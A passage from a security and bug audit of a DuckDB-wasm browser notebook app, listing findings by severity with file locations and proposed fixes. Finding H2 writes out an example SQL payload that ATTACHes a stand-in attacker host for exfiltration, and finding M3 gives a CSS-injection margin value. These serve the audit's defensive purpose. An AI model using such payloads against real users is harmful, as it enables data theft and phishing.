# Forward-pass audit — 2026-06-10

**Scope:** whole codebase, fresh eyes pass after v1.2 (Lakehouse Parity)
M1–M5 + v1.3 (Prior Art) M0–M6 shipped in the past two days. ~184
source files across `src/`, `tests/`, `scripts/`. Six parallel
subagents covered six slices (v1.3 engine modules, v1.3 UI integration,
v1.2 modules, older critical infra, UI cell renderers, build/CI/infra).

**Summary counts:** 3 Critical · 16 High · 33 Medium · 24 Low · 18 Stray
· 6 verified false-positives.

## Verification reality

This codebase ships as a single-HTML browser app on top of
DuckDB-wasm. The right verification surface depends on what's being
fixed:

- **Pure-logic fixes** (anonymize, query-builder, measures, stats,
  selections, lineage-edit, chart-shelves, report-layout): unit-
  testable via `vitest`. Add an assertion to the matching test file
  in `tests/`.
- **Engine behaviour** (engine.ts, mount.ts, persistence.ts): no
  Node-side harness; depends on `npm run smoke` (Playwright headless
  Chrome boot of `dist/index.html`) for end-to-end coverage.
- **UI rendering** (cell renderers, modals, shell): smoke catches
  CSP / FSA / worker-bootstrap regressions but does NOT yet exercise
  the v1.3 surfaces (stats, report, measures-panel). See H8.
- **CI:** `deploy.yml` runs only `npm ci && npm run build`. No
  `npm run check`, no tests, no smoke. Every gate is human-runs-
  locally-first. See M20.

`[test]` markers below identify items that NEED a runtime check beyond
unit tests.

---

## Findings — Critical

**C1** — [Bug] `src/ui/cells/sql-cell.ts:234` — the "Explain this error"
button has BOTH the static HTML `hidden` attribute AND the
`.cell-sidecar-trigger` class. The class is gated via
`.app-sidecar-enabled` (`shell.css.ts:521`), but the `hidden`
attribute applies `display: none` regardless of any other CSS rule.
Nothing in the codebase ever removes `hidden` from this button. The
v1.1 Explain-error sidecar job (W2) has been silently broken since
shipping. · Fix: remove the `hidden` attribute from the button HTML;
let the existing `.cell-sidecar-enabled` class gate handle visibility.
**[test in Chrome]**

**C2** — [Stray + Bug-by-omission] `scripts/check-bundle-size.mjs:5,22,37`
cites "spec amendment A30" raising the bundle cap from 600 KB to
750 KB. **A30 was never written.** `plan/spec-amendments.md` ends at
A29 (footer: "Future amendments live here"). DECISIONS.md has no
entry for the budget raise. STATUS.md still reads
"590.6 KB / 600 KB" from v1.2 M5. The check-script's user-facing
error message points at a phantom doc. Per project stop-checklist
#5 + #6, this is a documentation gap that loosens spec §7.1 without
a written rationale. · Fix: write A30 (mirrors A25–A29 shape); update
STATUS.md + DECISIONS.md with the v1.3 M0–M6 series.

**C3** — [Bug] `src/core/lineage-edit.ts:144-153` —
`roundTripInvariantHolds` is **tautological**:

```ts
const directly = applyCanvasOp(graph, op);
const viaCanvas = applyCanvasOp(graph, op);  // SAME call
return JSON.stringify(a.nodes) === JSON.stringify(a.nodes);  // self
```

The function compares the result of calling `applyCanvasOp` to itself
and can never return false. The handoff calls this "THE load-bearing
test of M6." The three `tests/lineage-edit.test.ts` round-trip
assertions therefore prove **nothing** about the round-trip claim.
· Fix: apply the op via two genuinely different paths — e.g., walk
the canvas via `projectToCanvas` first, then apply, vs. apply directly
to the graph, and compare. OR reframe the test as: serialise the
applied graph + replay through `projectToCanvas` and assert the
replayed canvas matches the projection of the original-plus-op. The
test must be able to detect a regression in `applyCanvasOp`.

---

## Findings — High

**H1** — [Security/Stray] `src/core/handles.ts:46-50` exports
`deleteHandle(id)` but **it is never called**. Two leak paths:
(1) `src/core/sessions.ts:136-148 deleteSession()` only removes
`sessions/<id>/snapshot`; the source's FSA `handleId` rows in the
`HANDLES_STORE` IDB store stay forever. (2) `src/main.ts:1169-1201`
`'removeSource'` action drops views + clears secrets but never calls
`deleteHandle(src.ref)` for `fsa-folder`/`fsa-file` kinds.
Consequence: orphaned FSA directory handles accumulate per session
lifetime; the user sees "previously-granted" re-grant prompts for
sources they thought they removed. · Fix: call `deleteHandle(ps.ref)`
in `sessions.deleteSession` for each fsa source, and in the
`'removeSource'` action handler. Both are one-liners.

**H2** — [Security] `src/core/persistence.ts:249-260` — `parse()`
does `JSON.parse(text)` then **casts straight to `NakliDataFile`**
with comment "Trivial migration path for v1.0 — just trust the
shape." The lens-confirm modal (`src/ui/lens-confirm-modal.ts`,
v1.2.2 A19) gates ONLY remote-source kinds — it does NOT preview
SQL cells. A `.naklidata` file (or `?lens=` link) with
`cells[].code = "ATTACH 'http://attacker/exfil.db'; ..."` lands +
executes on the user's first Run click without warning. · Fix at
minimum: extend the lens-confirm modal to surface the SQL cell
bodies before auto-mounting; ideally add a structural validator for
`.naklidata` shape (one-pass walker confirming cell kinds + code is
string + no extra-injected top-level keys).

**H3** — [Security] `src/core/url-state.ts:27-32` — `decodeLensParam`
decompresses `?lens=` blindly with no max-bytes cap. Base64-gzip of
highly-repetitive content compresses ~1000:1; a ~5 KB URL can
decompress to several MB and OOM the tab via `new
Response(stream).arrayBuffer()`. · Fix: cap decompression at e.g.
2 MB (10× the largest reasonable workbook description) and reject
early.

**H4** — [Bug] `src/core/lineage.ts:64-76` — `walk()` recurses every
value of every object with **no cycle guard**. A cyclic plan JSON
stack-overflows. DuckDB-wasm's EXPLAIN output is a tree in practice,
BUT lineage is round-tripped through `.naklidata`; a malformed file
could feed a cycle. The module's sibling `refresh.ts:106` explicitly
cycles-guard via `visited` set — `lineage.ts` should mirror. · Fix:
add a `WeakSet<object>` and bail on re-entry.

**H5** — [Bug] `src/core/query-builder.ts:154-199` `validateSpec` only
catches `limit < 1`. `NaN < 1` is `false` so NaN passes. In
`buildLimit`: `Math.floor(NaN) → NaN`, `Math.min(1M, NaN) → NaN`,
`Math.max(1, NaN) → NaN`, `String(NaN) → "NaN"`. Result: `LIMIT NaN`
which DuckDB rejects at run time. The UI gates with
`Number.isFinite` so today's path is safe — but the emitter is the
documented public surface (called by tests + the `qb-generate`
action). · Fix: in `validateSpec`, also reject
`!Number.isFinite(spec.limit) || spec.limit < 1`. One line.

**H6** — [Bug] `src/core/lineage.ts:191` — `extractFilePath` regex
`/'([^']+\.(?:parquet|csv|tsv|json|jsonl|arrow|ndjson))'/i` requires
the path to **end** in one of seven extensions. Misses:
`s3://bucket/object`, `https://x/file.parquet?token=abc`,
`.gz`/`.zst` compressed variants. The headline v1.2 use case
(S3-mounted lakehouse data) loses lineage edges silently; the M3
refresh cascade then misses the dependency. · Fix: extend regex to
allow query string + optional compression suffix; also pick up
`s3://`/`https?://` schemes directly.

**H7** — [Bug] `src/core/query-builder.ts:205-218` —
`buildSelect` ignores `selectColumns` entirely when
`aggregates.length > 0`. The doc-comment on
`QueryBuilderSpec.groupBy` (line 49) says "every selectColumn must
be either in groupBy or in aggregates," but the emitter silently
drops them. · Fix: enforce in `validateSpec` (throw on violation) OR
document the silent drop AND warn in the UI when columns are
selected alongside aggregates without GROUP BY membership.

**H8** — [Stray/Gap] `scripts/smoke.mjs` has zero hits for
`add-stats`, `add-report`, `add-measures`, `stats-cell`,
`report-cell`, `chart-shelves`, or `lineage-edit`. Six v1.3
milestone surfaces shipped with no smoke coverage. The smoke test
is the project's only headless E2E gate on the built artifact
(stop-checklist #1). Fixing this catches CSP / FSA / worker-
bootstrap regressions the unit tests miss. · Fix: extend
`scripts/smoke.mjs` to click `add-stats` and `add-report` toolbar
buttons; assert the cell DOM renders. Mirrors Wave 5/6
checks at lines 368–396.

**H9** — [Bug] `src/core/persistence.ts:237-247` `cellWithoutResults`
strips `status/lastError/lastResult` only for
`'sql' | 'cohort' | 'assertion'`. A `'stats'` cell carries
`status/lastError/descriptives/correlations`, which round-trip RAW
through `.naklidata`. After save → reload, a stale descriptives
snapshot displays as if it were a fresh compute against the
upstream cell whose `lastResult` was cleared on the same save. The
renderer never re-runs because the user didn't click Run. · Fix: add
a stats branch zeroing `status:'idle', lastError:null,
descriptives:null, correlations:null`.

**H10** — [Bug] `src/core/report-layout.ts:103-121` emits
`body * { visibility: hidden }` then `.report-cell, .report-cell *
{ visibility: visible }`. The class selector matches **every** report
cell in the notebook. `.report-cell { position: absolute; left:0;
top:0; width:100% }` then stacks them all at the same origin → PDF
is a mess of overlapping reports. The per-cell `<style>` tag also
injects duplicate `@page` rules with the LAST one winning. The
`report-print` handler at `src/main.ts:1359-1364` calls
`window.print()` with zero scoping; `naklidataRenderReport` scrolls
one into view but the CSS still un-hides every report. · Fix: scope
via `data-printing` toggled on the target cell; the @media-print CSS
keys off `.cell-report[data-printing]`.
**[test in Chrome]** (need to actually open the print dialog)

**H11** — [Stray/Missing implementation] `src/ui/cells/report-cell.ts:73-82`
renders `[@<cellName> — content embedded at render]` for `cell-ref`
items. **No code anywhere clones the referenced cell's rendered DOM
into the placeholder.** `grep -rn 'data-cell-ref'` returns only the
renderer's own write. A user clicking Print today gets the dashed-
border placeholder text in their PDF, not the chart/pivot/table they
referenced. This is the **entire point** of M3 cell-refs. · Fix: add a
`beforeprint` listener that walks `.report-cell-ref[data-cell-ref]`,
finds `[data-cell-id]` for the named cell, deep-clones its
`.cell-output` DOM into the placeholder, restores on `afterprint`.
Effort: medium. **[test in Chrome]**

**H12** — [Bug] `src/core/lineage-edit.ts:23-34, 61` — `NewCellKind`
is collected on the op but ignored. `applyCanvasOp` hard-codes
`kind: 'cell'` and the `sql`/`chart`/`pivot`/`stats`/`report`
discriminator is dropped on the floor. Any downstream cell-spawning
code that wants to distinguish those kinds has no information. The
chart-shelves test "the new cell is a cell-kind node" only checks
the LineageNode kind enum, missing that the cell-kind detail is
lost. · Fix: either carry `newCellKind` into a new optional field on
`LineageNode` (preferred — supports the M6 Phase 2 UI plan to
spawn the actual notebook cell), or drop the field from `CanvasOp`.

**H13** — [Bug] `src/ui/cells/sql-cell.ts:282-289` — numeric intra-cell
selection key drifts on display-format mismatch.
`td.dataset.value = display.text` where `formatCell` returns
`{ text: String(v), numeric: true }`. JS's `String(0.1 + 0.2)`
produces `"0.30000000000000004"`. Two rows that read the same
underlying numeric value but were computed via different paths
won't match (toggle thinks they're different values).
`buildIntraTableSelectionPredicate` then quotes them as STRING
literals via `quoteLiteral`, losing the numeric type — `WHERE col IN
('0.3')` against a `DOUBLE` column wouldn't match `0.30000…`. The
selection only round-trips through SQL once the inter-cell renderer
exists (currently Phase 2 stub), but this corrodes the foundation.
· Fix: store the underlying value with type tag in selections (e.g.,
`SelectionEntry { values: Array<{ type: 'number'|'string', value }> }`)
and emit type-correct SQL literals in `buildIntraTableSelectionPredicate`.

**H14** — [Privacy/Security] `src/ui/cells/sql-cell.ts:284-285` —
demo-mode column-name leak. The TH renders
`maskLabel('column', col)` (user sees `col_3`) but
`td.dataset.column = col` writes the RAW column name. The selection
chip in `renderSelectionsBar` then escapes-and-renders the raw name.
**In demo mode, clicking a masked column produces a chip with the
UNMASKED original name.** The whole point of demo mode (Theme 4
wave 2) was to enable screenshot sharing without leaking schema
intent. · Fix: pass the mask into `dataset.column` too, OR strip
masked columns from the click-to-select interaction in demo mode.

**H15** — [Bug] `src/ui/cells/stats-cell.ts:32-38` — the stats cell's
"input ref" line shows `@${cell.inputCell}` where `inputCell` is a
**cell id** (e.g., `c_le7sg7_3`), not the upstream cell's `name`. The
user reads `@c_le7sg7_3` and has no idea what it points to. The
display should resolve to the upstream cell's `name` (falling back
to `cell_<id>` only when unnamed). · Fix: lookup
`cell.inputCell → upstream.name ?? \`cell_\${upstream.id.slice(-6)}\``
in the renderer before interpolating.

**H16** — [Bug] `src/ui/lens-confirm-modal.ts:39-46`,
`src/ui/nl-to-sql-modal.ts:31-38`,
`src/ui/settings-modal.ts:67-77` — module-scope `_modalEl` lock with
no try/catch. If an exception throws between `_modalEl = overlay` and
the function return, the lock sticks pointing at a leaked overlay.
Any later open call silently refuses. Low risk because the open paths
are simple — but worth a try/finally that nulls `_modalEl` on throw.

---

## Findings — Medium

**M1** — [Bug] `src/core/stats.ts:60-71, 107` — alias collisions when
column names contain `__` and overlap with stat suffixes. Concrete:
columns `["x", "x__count"]` both produce alias `"x__count"` (x's
count-alias collides with x__count's keep-itself). DuckDB rejects
duplicate aliases. Worse: correlation pairs `(a, b__c)` vs
`(a__b, c)` collide at `corr__a__b__c`. · Fix: use a non-injective
alias scheme (e.g., index-prefixed: `${i}_${stat}` per column), or
disallow `__` in column names with a clear error. Tests at
`tests/stats.test.ts` should add a "two columns with shared __
substring" case.

**M2** — [Bug] `src/core/measures.ts:99-144` —
`validateMeasureExpression` false-positives on quoted-identifier
columns matching forbidden keywords. The keyword scan strips
single-quoted strings + comments but NOT double-quoted identifiers.
So `SUM("USE")`, `SUM("SET")`, `SUM("COPY")` are rejected, even though
those are legitimate column references. · Fix: also strip `"..."`
identifier literals (with `""` escape) before the keyword scan.

**M3** — [Security] `src/core/report-layout.ts:67-95, 103-121` —
`validateReport` does not validate margins; `buildPageCss` interpolates
them raw into a `<style>` tag set via `innerHTML`. A `.naklidata` JSON
with `margins.top = "0; } html { display: none } @page { margin: 0"`
survives parse and lands in `report-cell.ts:23`. Threat model is
"user opens their own file" so blast radius is small; but CSS
injection is real (lets a hostile file hide page chrome / inject
overlays / phish login modal). · Fix: coerce margins via `Number()`
+ `Number.isFinite()` + range clamp in `buildPageCss`, and add the
check to `validateReport`.

**M4** — [Bug] `src/core/lineage-edit.ts:55-83` — `insert-on-edge`
doesn't dedupe `newCellId` against existing nodes. If the caller
passes a `newCellId` that already exists, the result has two nodes
with the same id. · Fix: early-return `graph` (or throw) when
`graph.nodes.some(n => n.id === op.newCellId)`.

**M5** — [Bug] `src/ui/notebook.ts:395` — measure expansion order vs
lineage tracking. `measureExpanded.sql.matchAll(/@.../)` in
`recordLineageForCell` walks the ORIGINAL code, not the expanded
code — so cell-refs INSIDE a measure body are not captured for
lineage. Lineage panel under-reports edges introduced via measures.
· Fix: walk `measureExpanded.sql` for the `@-name` capture step OR
collect references from the measure-expansion path too.

**M6** — [Bug] `src/main.ts:830-842` — `handleRunStats` when
`cell.inputCell` is manually set does
`cells.find(c => c.id === cell.inputCell)` then casts
`(upstream as { lastResult: ... })`. If the user pointed inputCell at
a pivot or chart cell, the cast silently yields undefined and the
user gets "Upstream cell has no result. Run it first." — misleading.
· Fix: kind-guard in the manual branch; surface "Stats can only read
from SQL / cohort / assertion cells."

**M7** — [Bug] `src/main.ts:878-883` — stats column-bucket sampling
uses `typeof val === 'number'`. DuckDB returns BIGINT as `bigint`
(typeof `'bigint'`), DECIMAL as string sometimes. Those columns
bucket to `'other'` and skip mean/median/correlations. User-visible
symptom: correlations matrix empty even when columns ARE numeric.
· Fix: widen the typeof check (`number | bigint`) AND probe the
SQL type via DuckDB's `information_schema.columns` when available.

**M8** — [Security] `src/main.ts:134` —
`document.querySelector(\`[data-cell-id="${reportCellId}"].cell-report\`)`
in `naklidataRenderReport` takes raw id into the selector. A `"`
in the id breaks the parse; documented as external-callable but no
escape. · Fix: use `CSS.escape(reportCellId)` OR filter to
`/^[a-zA-Z0-9_]+$/`.

**M9** — [UX] `src/ui/measures-panel.ts` — form has no `<form>`
wrapper + no Enter binding. Enter in single-line inputs does
nothing; user has to mouse to "Add measure." Minor UX gap.

**M10** — [UX] `src/ui/measures-panel.ts:194` — sync `window.confirm`
from inside a modal. Chrome handles; stricter Safari UA settings can
drop it. Replace with a NakliData confirm-modal.

**M11** — [Wire-up gap] `src/main.ts:953-959` — `handleOpenMeasures`
re-render callback is a no-op. Adding/removing a measure doesn't
refresh the schema panel's "applicable measures" section. Worth a
follow-up but not a regression.

**M12** — [Bug] `src/ui/notebook.ts:88-228` — addCell's if/else-if
chain ends with unconditional `else { ... kind: 'chart' ... }`. If a
typo'd kind reaches addCell, user gets a chart. TS prevents this
from typed call sites, but `data-nb-action` strings aren't type-
checked at runtime. · Fix: cap with `never` exhaustiveness check
that throws on unknown kind.

**M13** — [Bug] `src/ui/cells/chart-cell.ts:39-55` vs
`src/ui/cells/types.ts:40-53` — chart-type literal list in the
picker is missing `'funnel'` and `'path'` (defined in
`ChartCellState`). A `.naklidata` file with `chartType: 'funnel'`
opens; the picker shows the FIRST option (`bar`) on first
interaction because `<option>` for `'funnel'` doesn't exist. The
canvas still renders the funnel, but the chrome is misleading.
· Fix: source the picker options from the type union.

**M14** — [Bug] `src/ui/notebook.ts:335-353` — `runAll` runs in
document order, not in DAG order. Comment says "matches DAG in
common case." If the user reorders cells in the workbook, downstream
cells may run before their inputs. Probably an intentional
simplification but worth flagging if cells become re-orderable.

**M15** — [Bug] `src/core/query-builder.ts:140` — date filter regex
rejects timezone offsets like `2026-01-01T12:00:00+05:30`. The
doc-comment says "ISO 8601"; ISO 8601 §4.2.5 includes `±HH:MM`.
· Fix: extend regex: `(?:Z|[+-]\d{2}:?\d{2})?`.

**M16** — [Bug/Perf] `src/core/refresh-engine.ts:155-172` — FSA folder
walk has no concurrency, batching, or subdirectory recursion. A
100k-file folder serialises 100k Promise round-trips O(N); user
perceives "Check for updates" as hung. Subdirectories silently
skipped — a nested-folder mount loses its rollups. · Fix: cap
iteration count + surface "folder too large to fingerprint";
optionally `Promise.all` over chunks of N.

**M17** — [Bug/UX] `src/core/query-builder.ts:206-215, 247-250` —
`aggregates` without GROUP BY emits `SELECT SUM(...)` with no
GROUP BY (whole-table aggregate). DuckDB accepts; not a SQL error.
Combined with H7, "add SUM(amount)" + leave selectColumns alone →
user gets an unexpected single-row scalar.

**M18** — [Bug] `src/core/sidecar/client.ts:917-920` —
`parseProposeChartResponse` fence regex handles a single fence pair
only. A response wrapped in `\`\`\`json\n\`\`\`json\n{…}` (double-
fenced — observed from some LLMs) fails JSON.parse and returns
`proposal: null`. Mild eval-score hit. · Fix: greedy strip of all
leading/trailing fences.

**M19** — [UX] `src/core/lineage-store.ts:197-201` — `removeCell`
leaves orphaned inbound edges pointing at the deleted cell. Doc-
comment acknowledges as intentional. Renderer shows the raw id when
the node is missing — produces stale labels until downstream re-runs.

**M20** — [CI gap] `package.json:11` — `npm run check` excludes
`vitest`, `smoke`, and `test:e2e`. `deploy.yml:46-48` runs only
`npm ci && npm run build` — no `check`, no `test`, no `smoke`, no
`test:e2e`. **A red tsc / biome violation / boundary breach /
bundle overage / test failure all ship to GitHub Pages today.**
· Fix: add a `verify` job to `deploy.yml` that runs
`npm run check && npm test && npm run smoke` before the build's
artifact upload; gate the deploy on `verify` passing.

**M21** — [CI gap] `deploy.yml:12-15` — no PR trigger. PRs receive
no automated verification. No fork-PR secret exfil risk (no
secrets referenced), but no enforcement of the very gates this
audit catches.

**M22** — [Boundary lint gap] `scripts/check-engine-boundary.mjs:29-52`
WATCHED_OPTIONAL is missing `src/core/chart-shelves.ts` (v1.3 M5) and
`src/core/lineage-edit.ts` (v1.3 M6). Both files declare
"Engine-boundary contract (v1.3 M0)" in their headers — author-
intended as engine modules, never added to the watched set. A
future edit pulling in `document.` would not be caught. · Fix: add
the two paths to WATCHED_OPTIONAL.

**M23** — [CI gap] Bundle-size check passes locally because the user
runs `npm run check` after `npm run build`. CI skips it. A bundle
over 750 KB ships to GH Pages until the next manual check.

**M24** — Same as C2 — bundle-size script's user-facing remediation
pointer ("Spec §7.1 (A30)") is broken until C2 is closed.

**M25** — [Bug] `src/core/persistence.ts:262-271` — `compareVersion()`
accepts non-numeric version strings silently. `parseInt('1.0-evil')
→ 1`; the comparison loop returns `0` ("equal"). A malicious
`.naklidata` with `version: "1.0-evil"` is treated as `=== "1.0"`.
Low real-world risk but the version-gate is the only safety
mechanism for the H2 parse-trust assumption. · Fix: validate
`/^\d+(\.\d+)+$/` first.

**M26** — [Bug] `src/core/engine.ts:1036-1050` — `explainPlan()` JSON-
prefix heuristic checks `v.charCodeAt(0)` for `[`/`{`. If DuckDB
ever emits the plan as `"  {…}"` (leading whitespace) the heuristic
skips it. Falls back to regex extractor — graceful, but the happy
path silently degrades. · Fix: trimStart before the check.

**M27** — [Bug] `src/core/taxonomy/client.ts:56,158-166` — `nextId++`
collision possible on HMR module re-init (resets to 1 without
clearing `pending`). Non-issue in production. · Fix: switch to
`crypto.randomUUID()` for parity with `sessions.ts:36`.

**M28** — [UX/Stray] `src/core/mount.ts:283-331` —
`mountExampleBundle` accumulates `failed[]` array, surfaces only a
`console.warn`. Caller can't show "3 of 4 example files mounted"
to the user.

**M29** — [Bug] `src/core/mount.ts:475-518` `mountUrl` (and
`mountS3Endpoint`, `mountIcebergTable`, `mountIcebergCatalog`,
`mountComputeBridge`) — if a step after `engine.registerUrl(...)`
fails (e.g., body fetch fails during `getRowCount`), the DuckDB view
is left registered. On retry, `CREATE OR REPLACE VIEW` clobbers it,
but the stale view sits in the engine consuming a name + view-list
entry between attempts. · Fix: `try { ... } catch { engine.drop(tableLabel); throw }`
wrapper around the row-count step in each mount* function.

**M30** — [Security] `src/core/sidecar/local-cache.ts` — no integrity
hash check on cached model weights. A corrupted file (e.g., after a
browser crash mid-write) is loaded into onnxruntime → cryptic
protobuf-parse error; user has to manually clear cache. Tamper risk:
requires same-origin OPFS write, which only NakliData itself does
— not a remote-attacker path. UX gap, not a vulnerability. · Fix:
store `sha256.txt` per file alongside; validate on read.

**M31** — [Bug] `src/core/stats.ts:139-156` — `parseDescriptivesRow`
does NOT sanitize NaN, while `parseCorrelationRow` does. The test at
`tests/stats.test.ts:205-217` codifies "NaN sanitized to null" for
correlation; descriptives just returns `v as T`. DuckDB rarely emits
NaN, but the inconsistency is worth flagging. · Fix: add
`Number.isFinite(v) ? v : null` filter for `mean`/`stddev`/`median`
specifically.

**M32** — [Bug] `src/core/measures.ts:151-166` — `validateMeasuresFile`
doesn't detect cycles statically. Cycles surface only at expansion
time as a depth-cap throw. · Fix: cycle pre-pass using
`findReferencedMeasures`.

**M33** — [Stray] `src/ui/cells/markdown-cell.ts:100` — `escapeHtml`
only escapes `&<>` (not `"`). No actual XSS (content flows into
element-content position, not attribute) but the inline regex order
can produce unbalanced matches on `***foo***`.

---

## Findings — Low

**L1** — `src/core/refresh.ts:181-184` — `Number.parseInt('0', 10)
→ 0`, then `0 || null → null`. A zero-byte file becomes `null` in
the fingerprint → comparing `null === null` is equal → zero-byte
file never marked stale even when ETag changes.

**L2** — `src/core/lineage-store.ts:209-225` — `toJSON()` prunes
orphan nodes; on reload via `loadFromJson` they're lost. Round-trip
is lossy by design but not documented.

**L3** — `src/ui/query-builder-modal.ts:201-206` — `qb-limit` ignores
invalid input silently (no visible feedback).

**L4** — `src/ui/refresh-modal.ts:108-114` — doesn't dedupe labels.
If the same source/cell appears twice, each is rendered.

**L5** — `src/ui/sinks/anonymize-modal.ts:123-127` — hex-paste regex
accepts odd-length salts (e.g., 11 chars). DuckDB md5 doesn't care
but recipients may be confused.

**L6** — `src/ui/shell.ts:96-110` — hardcoded amber palette in
selection chips violates the CLAUDE.md "Color values come from
src/tokens/colors.ts only" rule. No `selection-chip` token; drifted
in M1.

**L7** — `src/ui/cells/sql-cell.ts:324` `formatCell` for bigint —
`typeof v === 'bigint'` returns `text: v.toString()`. Defensive but
inert.

**L8** — `src/ui/cells/pivot-cell.ts:182` — `let totalsCount; void
totalsCount` is dead. Either delete or implement avg-of-totals.

**L9** — `src/ui/nl-to-sql-modal.ts:168` — reads SQL from
`result.textContent`. Round-trip through DOM could lose specific
whitespace. Niggle.

**L10** — `src/ui/cells/report-cell.ts:101-105` — `printReportCell`
exported but never called. main.ts uses its own `window.print()`
call.

**L11** — `src/ui/settings-modal.ts:65,497` — `_onKey` not nulled if
opens twice in a row before close. Guarded by `if (_modalEl)` so
practically OK.

**L12** — `src/ui/notebook.ts:81-83` `Notebook.load()` only disposes
`kind === 'sql'`. Cohort + assertion cells have CM6 editors too;
not disposed on `load()`. Impact: small (genCellId precludes id
collisions) but the dispose loop should match the run-targets list.

**L13** — `src/core/anonymize.ts:163-164` — `ident` and `aliased`
duplicate `quoteIdent` calls. Cosmetic; the keep-case's
`"col" AS "col"` is redundant.

**L14** — `src/core/chart-shelves.ts:170-183` — `configToShelves`'s
`cls(name: string | null)` has a dead `null` branch. All call sites
guard with `config.xColumn ? ... : null`.

**L15** — `src/core/measures.ts:183` — `MEASURE_CALL_RE` is module-
level and mutated by `expandMeasures` (`lastIndex` via `.test()` +
`.replace()`). Safe under single-threaded JS today; build a fresh
regex per call as cheap insurance.

**L16** — `src/ui/lineage-panel.ts:316` —
`depth.set(n.id, Number.POSITIVE_INFINITY)` for sinks is dead. The
only sink-position consumer reads via the dedicated `sinkCol`
branch. Cosmetic.

**L17** — `src/ui/lineage-panel.ts:299-303` — layout uses linear
`find` inside a `cells.length + 1` loop → O(V² × E). Fine for graphs
< ~50 nodes. Optimisation note only.

**L18** — `src/core/selections.ts:111-116` — `selectionKeyString`
split parsing assumes `::` never occurs in column names. Low risk
for DuckDB names; Postgres-style cast aliases (`col::int`) would
break.

**L19** — `scripts/smoke.mjs:105` — `await page.goto(targetUrl,
{ waitUntil: 'domcontentloaded' })`. Per cross-project notes,
`'load'` is safer.

**L20** — `scripts/fetch-duckdb-extensions.mjs:78`,
`scripts/fetch-duckdb-fallback.mjs:58` — `fetch(url)` with no abort
signal. A hung `extensions.duckdb.org` stalls `npm install`
indefinitely.

**L21** — `tests/e2e/playwright.config.ts` — `retries: 0` and
`fullyParallel: false`. Reasonable due to DuckDB-wasm memory; combined
with M20 (`test:e2e` not in CI) e2e specs are documentation-only.

**L22** — `README.md:56` mentions `gen-examples.mjs` as a user-
runnable command — script is not in `npm scripts`.

**L23** — `src/core/engine.ts:1058-1072` `close()` — `setStatus('idle')`
inside the inner `finally` means callers that catch the close error
see status=idle even though engine never cleanly closed. Mostly
cosmetic.

**L24** — `src/core/url-state.ts:73` — `String.fromCharCode(bytes[i]
?? 0)` — `bytes[i]` is never undefined for `i < bytes.length` on a
Uint8Array. Defensive but unreachable.

---

## Findings — Stray (cleanup)

**S1** — `src/core/chart-config.ts:74,93,112` — `isChartConfig`,
`validateAgainstColumns`, `defaultChartConfig` exported but called
from nowhere in `src/` or `tests/`.

**S2** — `src/core/chart-shelves.ts`, `src/core/lineage-edit.ts` —
entire modules are orphans (no `src/` consumer; only tests import).
Waiting for Phase 2 UI work.

**S3** — `src/core/measures.ts` — `applicableMeasures` exported but
called from nowhere in `src/`. Tests use it.

**S4** — `src/core/measures-store.ts:87`, `src/core/selections.ts:225`
— `_resetMeasuresStoreForTests` / `_resetSelectionsStoreForTests`
unused.

**S5** — `src/ui/cells/stats-cell.ts:211` —
`export type { StatsColumnType }`. No file imports it from
`stats-cell.ts`.

**S6** — `src/ui/cells/types.ts:3-12` — `CellKind` alias missing
`stats` and `report` (added in v1.3 M3+M4 to the union but not the
alias). Zero importers today; a future import would be a footgun.

**S7** — `src/ui/cells/report-cell.ts:101-105` — `printReportCell`
exported but unused.

**S8** — `src/ui/sinks/sinks.ts:224-226` — re-defines a local
`quoteIdent` identical to `anonymize.ts:82-84`'s exported one. Use
the shared one.

**S9** — `src/core/sidecar/client.ts:60-116` `defaultTransport` — five
`if (req.provider === 'foo')` branches. Tabling opportunity.

**S10** — `src/core/persistence.ts:61-66` `PersistedSource` — informal
union with optional fields per kind. Would benefit from a tagged
union at v1.4 schema bump.

**S11** — `src/core/mount.ts:8-15` — imports `PermissionLostError,
ensureReadPermission, newHandleId, putHandle` but **not**
`deleteHandle`. This is the missing-callsite for H1.

**S12** — `src/core/persistence.ts:361-365` — stale comment block
referring to "IDB workbook snapshot moved to `sessions.ts`". The
legacy `workbook/current` migration in `sessions.ts:67-82` has now
run on every existing install since v1.0 → v1.1. Drop after v1.4.

**S13** — `src/core/engine.ts:1075-1117` `bundlesFor` — duplicates
bundle-URL list 3× (fallbackBase / offline / cdn).

**S14** — `scripts/probe-cm6-survival.mjs`, `scripts/probe-hash-
mismatch.mjs` — one-shot probes still on disk; not in `npm scripts`;
both referenced as `[x]` in `plan/pending.md`. ~12 KB of dead code.

**S15** — `scripts/verify-demo-ecommerce.mjs` — one-shot demo runner,
not in npm scripts. ~12 KB.

**S16** — `src/lazy/_demo.ts` and `dist/chunks/_demo.js` — stub
template from the lazy-chunk pattern. 126 bytes built.

**S17** — `src/ui/nl-to-sql-modal.ts:168` — `sql.startsWith('(')`
gate is belt+suspenders; the `disabled` state on `insertBtn` is the
actual gate.

**S18** — `src/ui/shell.ts` + `src/main.ts` — `renderSelectionsBar`
dataflow runs through two separate files. Pattern note.

---

## False positives / non-issues (verified)

**FP1** — `src/core/engine.ts close()` "double-throw worker leak."
Agent 4 verified: `worker.terminate()` is in the inner `finally`,
always runs. State is correctly cleaned even on double-throw. Demoted
to L23 (cosmetic).

**FP2** — `src/taxonomy/client.ts nextId` integer-overflow risk. At
~1000 classifies/min, takes ~17 billion years. Not a real bug.
Module-reset collision retained as M27 (HMR-only edge case).

**FP3** — `src/core/sidecar/local-cache.ts` partial-write cleanup.
Verified in place at lines 277-289 (catch + removeEntry + rethrow).
The v1.2 slice B fix shipped correctly.

**FP4** — `addCell('chart')` regression after report-branch addition.
Verified by reading the if/else chain in `notebook.ts:88-228`: report
and stats are explicit `else if`; chart is the final `else`. No
regression.

**FP5** — Classic prototype pollution in `persistence.parse()`. Agent
4 verified: no `Object.assign(target, parsedKeys)` of user-controlled
keys into a built-in object. H2 stands as a different concern
(untrusted SQL via lens-share).

**FP6** — Markdown XSS via `escapeHtml` missing `"`. Verified:
content always flows into element-content position, not attribute.
M33 retained as a quality observation.

---

## Worth a look (lower confidence)

**W1** — `src/core/selections.ts:111-116` — `selectionKeyString`
parses `key.split('::')`. If a Postgres-style cast alias like
`col::int` ever lands as a column name, the round-trip breaks. Low
risk for DuckDB names.

**W2** — `src/core/anonymize.ts:166` — `keep` strategy emits
`"col" AS "col"`. Trivially correct; the redundant aliasing is noise.
Consider omitting `AS` when source == alias.

**W3** — `src/core/report-layout.ts buildPageCss` multi-page output
with `position: absolute; top:0` — could clip multi-page content.
Needs a real-browser smoke check.

**W4** — `src/core/measures.ts MEASURE_CALL_RE` — single-threaded JS
